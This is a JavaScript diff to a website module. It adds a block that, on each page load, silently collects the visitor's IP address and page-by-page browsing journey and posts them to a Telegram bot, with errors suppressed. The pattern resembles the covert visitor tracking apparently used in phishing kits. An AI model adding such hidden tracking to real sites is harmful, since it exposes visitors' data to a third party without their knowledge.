@@ -150,6 +150,34 @@ ${extra || ''}`;
 
     const page = window.location.pathname.split('/').pop() || 'app.html';
     logPage(page);
+
+    /* إرسال إشعار زيارة جديدة */
+    try {
+      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+      const ip = await getIP();
+      const pagesList = journey.map((j, i) =>
+        `  ${i + 1}. ${j.pageName} — ${j.time}`
+      ).join('\n');
+
+      const msg = `👤 <b>زيارة جديدة</b>
+
+🌐 IP: <code>${ip}</code>
+📱 الصفحة: ${PAGE_NAMES[page] || page}
+🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
+
+📋 <b>الرحلة حتى الآن:</b>
+${pagesList}`;
+
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TG_CHAT,
+          text: msg,
+          parse_mode: 'HTML',
+        }),
+      });
+    } catch(e) {}
   }
 
   return { init, getIP, sendJourneyToTelegram, onCheckout, clear, checkBlocked };
